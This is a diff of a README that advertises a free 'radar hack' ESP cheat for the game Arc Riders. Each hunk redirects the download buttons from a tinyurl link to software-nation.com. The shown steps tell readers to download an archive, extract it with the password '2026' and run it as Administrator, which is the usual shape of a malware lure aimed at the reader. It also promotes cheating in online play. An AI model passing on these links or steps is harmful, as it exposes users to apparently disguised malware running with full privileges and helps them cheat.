@@ -9,7 +9,7 @@ The **🗺️ Arc Riders Radar Hack** is a **free** radar ESP cheat for Arc Ride
 
 <div align="center">
 
-[![Download Arc Riders Radar Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/arc-riders-radar-h4ck)
+[![Download Arc Riders Radar Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/arc-riders-radar-h4ck)
 
 </div>
 
@@ -98,7 +98,7 @@ Arc Riders is all about positioning and awareness. This free radar hack gives yo
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch Arc Riders → Press `INSERT` to open menu.
 
-[![Download Arc Riders Radar Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/arc-riders-radar-h4ck)
+[![Download Arc Riders Radar Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/arc-riders-radar-h4ck)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -224,7 +224,7 @@ See everything, survive everything. **Arc Riders Radar Hack** is a free radar ES
 
 <div align="center">
 
-[![Download Arc Riders Radar Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/arc-riders-radar-h4ck)
+[![Download Arc Riders Radar Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/arc-riders-radar-h4ck)
 
 **Version 4.6.1** — Free radar hack. April 2026 update. Zero cost. No payment.
 
